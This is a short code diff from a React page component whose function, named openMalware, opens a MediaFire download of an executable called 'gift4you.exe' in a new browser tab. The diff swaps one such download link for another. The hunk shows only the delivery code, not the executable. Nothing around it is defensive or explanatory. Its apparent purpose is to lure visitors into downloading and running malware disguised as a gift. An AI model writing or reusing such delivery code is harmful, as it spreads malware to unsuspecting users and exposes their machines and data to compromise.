@@ -4,7 +4,7 @@ import React from "react";
 const Page = () => {
 
   const openMalware = () => {
-    window.open('https://download1519.mediafire.com/g96nutsw85tgtYPGkHp88SUKl4FqM8TzeCddHZvymfynbc-fhvyZ9Hhpj-xg26fDmafGTGbuMVNelQNpBNoErDW4ycm-yMBw2FdzZ91BAaEaPJmIhs062BhbC4tUZQhaz3ccM3qEzbtQhTxxWDsZ8fYZieCtW5lGugH_5vKPA2U/r6aml24vg94prtr/gift4you.exe', '_blank', 'noreferrer')
+    window.open('https://download1519.mediafire.com/mjdplx1dygsgHjpm-vYZhDHgY8HPp3JlwEaBXflqxCW6J1AQoAWuRz6JluNoBl-EutyTbrJvWp-42ZVETJu79aCJG7A94c6ZXDCEQS5hPs7tG4jaCuF3O1iK69etGTnbXYsc_8LdjCX7MksAwxi7YT8s_hi-tGRTRP4zxGhHSFPH_7k/xqi4xdl5gvqo8m3/gift4you.exe', '_blank', 'noreferrer')
   }
 
   return (
